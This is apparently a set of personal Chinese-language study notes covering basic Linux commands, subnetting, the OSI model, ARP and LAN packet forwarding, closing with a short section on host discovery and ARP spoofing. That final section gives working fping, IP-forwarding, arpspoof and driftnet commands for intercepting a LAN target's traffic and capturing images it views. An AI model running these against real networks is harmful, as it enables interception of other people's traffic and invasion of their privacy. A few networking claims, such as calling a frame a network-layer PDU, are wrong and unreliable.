jupyter notebook  //打开notebook python
--------------------------------------------------------------------------------------------
创建文件： touch 文件名

删除文件： rm 文件名

创建文件夹： mkdir 文件夹名

删除文件夹： rmdir 文件夹名

注意此时的文件夹中如果包含其他文件的话是无法被删除的。

删除带有文件的文件夹： rm -r 文件夹名
--------------------------------------------------------------------------------------------
3 ls 显示当前目录所有文件或文件夹

ls -h

ls -l

ls -a

或者 ls -alh 这样也行
--------------------------------------------------------------------------------------------
ls过滤

通配符：* 即可以代替任何符号数字

使用例子如下；ls *.py 代表显示当前文件夹中名字带有.py后缀的所有文件，*可以代表长度无限的数值或符号。

若 ls ?.py 代表显示当前文件夹中名字带有.py后缀的所有文件，但是？只能代表一个数值或符号

若 ls 1[1-6]5.py 代表显示当前文件夹中带有.py后缀，且第一个为1，第二个为1到6的数字，第三个为5的 所有文件。
--------------------------------------------------------------------------------------------

5. 就是将ls命令输出的结果保存到一个指定文件中去。一个大于号就是会覆盖之前文件中的东西，两个大于号，就是在文件中末尾加入。
--------------------------------------------------------------------------------------------
6 cat命令 ：打开指定文件，并且将文件中内容显示在终端。。
--------------------------------------------------------------------------------------------
8 gedit 命令 打开某个文件，显示是在桌面
--------------------------------------------------------------------------------------------
cp 拷贝文件
cp  248.py  text/
# 拷贝248.py 文件到text文件夹下
--------------------------------------------------------------------------------------------
tree命令 ：显示当前路径中所有文件，并且用树状显示
--------------------------------------------------------------------------------------------
把100.py文件剪切到test文件夹中，mv命令也可以用于重命名。如命令 mv 284.py 285.py

可以看做同一个路径下把284文件剪切到285文件中

mv 100.py test
--------------------------------------------------------------------------------------------
文件名必须是tar后缀

打包实例：命令 tar -cvf 文件名 要打包的文件

解包：命令 tar -xvf 文件名

--------------------------------------------------------------------------------------------

查看文件位置 which

--------------------------------------------------------------------------------------------

cal 日历
date 时间
reboot 重新启动操作系统
shutdown
        shutdown -r now 重新启动操作系统  shutdown会个给的用户提示
        shutdown -h now 立即关机 now相当于0
        shutdown -r 20:25 系统会在今天的20：25关机
        shutdown -r +10  系统会在10分钟之后关机
init 0 关机
init 6 重启
df 检查磁盘空间


-------------------------------------------------------------------------------------------------

将IP和掩码 转换bai为2进制 ，再相与 ，得到网络号 都一样就表示在同一网段。

一：
11000000. 10101000.00000000. 00000001 192.168.0.1
11111111. 11111111.11111111. 00000000 255.255.255.0
上面相与 得bai （ 1+1=1 1+0=0）
11000000. 10101000.00000000.00000000 192.168.0.0 网络号
二：
11000000. 10101000.00000000. 00000010 192.168.0.2
11111111. 11111111.11111111. 00000000 255.255.255.0
得
11000000. 10101000.00000000. 00000000 192.168.0.0 网络号
三：
11000000. 10101000.00000001. 00000001 192.168.1.1
11111111. 11111111.11111111. 00000000 255.255.255.0
得
11000000. 10101000.00000001. 00000000 192.168.1.0 网路号
所以 一和二 在一个网段，三不在
--------------------------------------------------------------------------------------------

WWW 80 ,FTP 21

OSI七层模型分为：物理层，数据链路层，网络层（IP协议），传输层（TCP协议），会话层，表示层，应用层。

1.传输层
应用层一般为TCP协议，将数据分成若干个包（加上端口号），然后传输到网络层；

2.网络层
网络层将传输层的数据加上自己的IP地址和对方的IP地址，采用ARP协议获取MAC地址。

4.数据转发
路由器会有一个路由表，选择一个不拥塞的网络，然后同样采用广播的方式，获取Mac地址，然后将数据发送到下一跳里。一直到发送到目标IP

这里需要有注意一个事情：
目的IP地址是最终的目的地，中间的数据包中的IP地址并不会发生改变。
而Mac地址会一直发生变化，他是决定下一跳到底将数据转发到哪里。

数据（Data）：应用层PDU的常用术语
分段（Segment）：传输层PDU
帧（Frame）：网络层PDU
比特（Bits）：在介质上物理传输数据所使用的PDU。


数据链路层是局域网那一层  Mac 地址
网络传输层是路由器那一层  Ip 地址

ARP请求包含目标设备的IP地址，LAN上的每一个设备都会检查该ARP请求，看看是否包含它自身的IP地址。只有符合该IP地址的设备才会发送ARP响应。ARP响应包含ARP请求中IP地址相对应的MAC地址。


局域网内数据包的发送过程

https://upload-images.jianshu.io/upload_images/4788840-8b0d0cab1c837661.jpg?imageMogr2/auto-orient/strip|imageView2/2/format/webp

1． PC1与PC2通信时，在PC1电脑中，应用层产生数据交给传输层；传输层进行数据的分段，使数据的大小适合在网络上传递，根据应用层不同软件产生的数据，选择不同协议栈进行封装TCP或UDP,再进行不同服务端口号的封装（例：WWW 80 ,FTP 21），再传递给网络层；网络层在数据包头部进行封装源IP、目的IP，根据上层协议栈标识不同协议号，当IP包头封装TCP时协议号为6、UDP协议号为17，用来标识上层使用的协议，继续传递给数据链路层； 数据链路层在数据包头部进行帧的封装，封装源MAC、目的MAC,由于不知道目的MAC地址，会进行ARP的广播包，封装一个全F的类型字段为0X0806广播包，交付给物理层，物理层转换成电信号（bit流），发送到交换机；

2． 交换机接收后发现为ARP的广播包，进行其解封学习到PC1的MAC地址，继续封装并除接受端口以外的端口再次进行ARP的广播；

3． 路由器收到交换机发来的ARP广播，进行解封，查看到数据包中的类型字段为0X0806即ARP的广播包，进行回复，源MAC为路由（网关）的MAC,目的MAC为PC1的MAC，类型字段为0X0806，经过物理层将数据转换为电信号（bit流）发送给交换机；

4． 交换机收到后进行解封，学习到源MAC（路由器的MAC ），发现目的MAC已经存在自己的MAC表中，查看目的MAC对应的端口，并从对应的端口发送到PC1;

5． PC1接收数据包后进行解封，学习到路由器(网关)的MAC，在数据链路层将目的MAC封装为路由器（网关）的MAC, 类型字段为0X0800,并在数据帧尾部封装FCS,来校验数据的完整性，然后向下层传递给物理层，物理层把数据帧转换成电信号（bit流），发送到交换机；

（注：不同网段的通信，PC机先把数据传送到网关）

6． 交换机接收到数据包，查看到目的MAC已存在自己的MAC表中，根据自己MAC表中对应的端口发送出去；

7． 路由器接收到数据包后进行解封装，在数据包头部发现目的ip，便查找路由表条目中对应的端口，便对数据进行重写，由于不知道目的主机的MAC地址，路由器会发送ARP广播，PC2收到数据包进行解封，发现是ARP广播，类型字段为0X0806，

然后对其进行封装回复，源MAC为PC2的MAC，目的MAC为路由器的MAC，路由器收到后把PC2对应的MAC地址和端口记录在MAC表中，

8． -pc2接受到信息，便对数据进行解封装，发现目的ip是给自己的，然后继续解封装，然后把数据传送给应用程序qq。然后对路由回复，在传输层设源端口号为8000，目的端口号为4000，封装udp头部。在网络层将源ip设为192,。168.2.1，目的ip设为192.168.1.2，协议号为17，在数据链路层将源mac设为12个3，目的mac设为12个1，类型字段为0x0800，封装FCS，然后经物理层将数据转为bit流传给路由器，路由器再查找路由表，并对数据进行重写，从f0/0传送出去，交换机解封装，查找mac表，再对数据进行封装，从f0/0传送给pc1.通信完成。

NAT 网络地址转换方法

ip route 查看路由表

arp -a 地址解析协议，即ARP（Address Resolution Protocol）

VLAN 虚拟局域网

LAN 局域网 Local Area Network

WAN 广域网 Wide Area Network

WLAN 无线局域网 Wireless Local Area Network

DHCP
	
（ARP （地址解析协议）广播）

Netmask 子网掩码

broadcast 广播

Ethernet 以太网

集线器（hub）

网桥（bridge）

交换机（switch）

在常见的家用路由器/小型办公室用企业路由器中，一般集成了交换机，路由器，NAT，DHCP Server 等多个角色。


网关的分类：

1、协议网关：协议网关通常在使用不同协议的网络间做协议转换工作，这是网关最常见的功能。协议转换必须在数据链路层以上的所有协议层都运行，而且要对节点上使用这些协议层的进程透明。协议转换必须考虑两个协议之间特定的相似性和差异性，所以协议网关的功能十分复杂。

2、应用网关：应用网关是将一个网络与另一个网络进行相互连通，提供特定应用的网络间设备，应用网关必须能实现相应的应用协议。应用网关可以看做是运行于要求特定业务的客户机与提供所需业务的服务器之间的中间过程。

3、安全网关：安全网关是各种技术有趣的融合，具有重要且独特的保护作用，其范围从协议级过滤到十分复杂的应用级过滤。设置的目的是防止Internet或外网不安全因素蔓延到自己企业或组织的内部网。


---------------------------------------------------------------------------------------------


集线器（hub）
一个口收到的信号，原封不动的发送给所有其他的口，由其他的口上的设备自己决定是否接收信号。有点类似广播，但是比广播更纯粹。由于hub只是简单的转发，所以hub工作在物理层（L1）。
网桥（bridge）
工作在数据链路层（L2）。以太网中，数据链路层地址就是mac地址，网桥与hub的区别在于，网桥会过滤mac，只有目的mac地址匹配的数据才会发送到出口。一个bridge指的是一个输入到一个输出的桥接。
交换机（switch）
早期的switch，其实可以看成多个bridge的集成设备，因此也工作在数据链路层。一个交换机口的输入到另一个交换机口的输出，可以认为是一个bridging。交换机中的MAC table，实际是为了bridge能工作而存在。一个N口交换机可以看成是 N（N -1）个网桥
但是事情也不是绝对的，随着技术的发展，也常常听到L3 Switch，也就是说switch也可以包含routing功能。
路由器（router）
工作在网络层（L3），基于IP地址做转发。


-----------------------------------------------------------------------------------------------

#探测存活主机
fping -a -g 192.168.118.1/24
route -n
ifconfig

开启arp转发
# 0是关闭，1是开启
sudo echo 1 > /proc/sys/net/ipv4/ip_forward  有可能没有权限
(sudo echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward)
#arpspoof -i 网卡 -t   目标IP          网关
arpspoof -i wlp2s0 -t 192.168.118.138 192.168.118.2
#攻击时,目标网络断开. 
#结束后,目标网络恢复.
#使用图片嗅探工具driftnet来捕获目标主机查看的图片
sudo driftnet -i eth0


-----------------------------------------------------------------------------------------------

https://www.cnblogs.com/canfoo/p/6891868.html

-----------------------------------------------------------------------------------------------
